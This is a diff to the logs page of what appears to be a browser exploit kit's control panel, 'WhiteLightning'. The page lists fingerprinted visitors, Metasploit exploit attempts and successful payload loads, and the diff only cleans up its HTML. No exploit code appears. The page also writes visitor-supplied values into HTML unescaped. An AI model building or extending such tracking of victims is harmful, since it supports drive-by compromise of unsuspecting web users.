@@ -8,44 +8,20 @@
 		header("Location: login.php");
 	}
 ?>
-
-<html lang="en">
 <head>
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="author" content="">
-
     <title>WhiteLightning -> Logs</title>
-
-    <!-- Bootstrap Core CSS -->
-    <link href="css/bootstrap.min.css" rel="stylesheet">
-
-    <!-- Custom CSS -->
-    <link href="css/sb-admin.css" rel="stylesheet">
-	<link href="css/tabs.css" rel="stylesheet">
-
-    <!-- Custom Fonts -->
-    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-
-    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-    <![endif]-->
-
+	
+    <link rel="stylesheet" type="text/css" href="css/tabs.css">
+	
+    <script type="text/javascript" language="javascript" src="js/jquery.js"></script>
+    <script type="text/javascript" language="javascript" src="js/bootstrap.min.js"></script>
+    <script type="text/javascript" language="javascript" src="js/tabs.js"></script>
 </head>
 <body>
     <div id="wrapper">
         <?php include('outline.php'); ?>
         <div id="page-wrapper">
-
             <div class="container-fluid">
-
-                <!-- Page Heading -->
                 <div class="row">
                     <div class="col-lg-12">
                         <h1 class="page-header">
@@ -61,15 +37,12 @@
                         </ol>
                     </div>
                 </div>
-                <!-- /.row -->
-
 				<div class="tabs">
 					<ul class="tab-links">
 						<li class="active"><a href="#tab1">Site Hits</a></li>
 						<li><a href="#tab2">Exploit Attempts</a></li>
 						<li><a href="#tab3">Successful Injects</a></li>
 					</ul>
-				 
 					<div class="tab-content">
 						<div id="tab1" class="tab active">
 							<div class="row">
@@ -92,7 +65,7 @@
 												$q = "SELECT hit_id, CONCAT_WS(' ', php_date, php_time) AS php_date_time, php_remote_addr, php_http_referer, php_http_user_agent, ua_os_family, ua_os_version, ua_os_platform, ua_browser_wow64, ua_browser_name, ua_browser_version, pd_os, pd_br, pd_br_ver, pd_br_ver_full, me_mshtml_build, be_office, pd_reader, pd_flash, pd_java, pd_qt, pd_rp, pd_shock, pd_silver, pd_wmp, pd_vlc FROM hits ORDER BY php_date_time DESC";
 												$r = @mysqli_query ($dbc, $q); 
 												while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
-													echo '<tbody><tr><tr class="danger">
+													echo '<tbody><tr class="warning">
 														  <td>'.$row['php_date_time'].'</td>
 														  <td>'.$row['php_remote_addr'].'</td>
 														  <td>'.$row['ua_os_family'].'</td>
@@ -160,11 +133,12 @@
 												$q = "SELECT throw_id, CONCAT_WS(' ', php_date, php_time) AS php_date_time, hit_id, msf_exploit_full_path, msf_target FROM throws ORDER BY php_date_time DESC";
 												$r = @mysqli_query ($dbc, $q); // Run the query.
 												while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
-													echo '<tr><tr class="warning">
+													echo '<tr class="warning">
 														  <td>'.$row['php_date_time'].'</td>
 														  <td>'.$row['hit_id'].'</td>
 														  <td>'.$row['msf_exploit_full_path'].'</td>
-														  <td>'.$row['msf_target'].'</td></tr>';
+														  <td>'.$row['msf_target'].'</td>
+													</tr>';
 												}
 											?>
 											</tbody>
@@ -188,9 +162,9 @@
 											<tbody>
 											<?php
 												$q = "SELECT load_id, CONCAT_WS(' ', php_date, php_time) AS php_date_time, throw_id, php_remote_addr, php_http_referer, php_http_user_agent FROM loads ORDER BY php_date_time DESC";
-												$r = @mysqli_query ($dbc, $q); // Run the query.
+												$r = @mysqli_query ($dbc, $q);
 												while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
-													echo '<tr><tr class="success">
+													echo '<tr class="warning">
 													      <td>'.$row['php_date_time'].'</td>
 														  <td>'.$row['throw_id'].'</td>
 														  <td>'.$row['php_remote_addr'].'</td></tr>';
@@ -205,19 +179,6 @@
 					</div>
 				</div>
             </div>
-            <!-- /.container-fluid -->
         </div>
-        <!-- /#page-wrapper -->
     </div>
-    <!-- /#wrapper -->
-
-    <!-- jQuery -->
-    <script src="js/jquery.js"></script>
-    <script src="js/tabs.js"></script>
-
-    <!-- Bootstrap Core JavaScript -->
-    <script src="js/bootstrap.min.js"></script>
-
 </body>
-
-</html>
